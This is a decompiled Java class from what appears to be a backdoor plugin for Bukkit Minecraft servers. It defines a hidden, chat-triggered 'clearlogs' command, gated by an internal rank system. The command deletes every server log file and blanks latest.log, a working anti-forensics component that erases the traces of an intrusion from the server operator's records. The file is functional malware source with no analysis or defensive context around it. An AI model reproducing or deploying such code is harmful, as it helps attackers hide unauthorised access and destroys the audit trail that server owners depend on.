package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.FileUtil;
import java.io.File;
import java.util.Objects;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "clearlogs",
   description = "Clears all the logs from the server",
   blatant = true,
   rank = Rank.DEVELOPER,
   aliases = {"dellogs", "deletelogs"}
)
public class ClearLogsCommand extends AbstractCommand {
   public ClearLogsCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      File var4 = new File("logs/");
      if (!var4.exists()) {
         ChatUtil.sendChat(var1.getPlayer(), "Logs folder not found!");
      } else {
         for(File var8 : Objects.requireNonNull(new File("logs/").listFiles())) {
            if (!var8.delete() && !var8.getName().equalsIgnoreCase("latest.log")) {
               ChatUtil.sendChat(var1.getPlayer(), "Failed to delete the log: " + var8.getName() + "!");
            }
         }

         try {
            FileUtil.flushFile(new File("logs/latest.log"));
         } catch (Exception var9) {
            ChatUtil.sendChat(var1.getPlayer(), "An error occurred while overwriting the latest.log file. Error: " + var9.getMessage());
         }

         ChatUtil.sendChat(var1.getPlayer(), "Finished deleting the logs!");
      }
   }
}
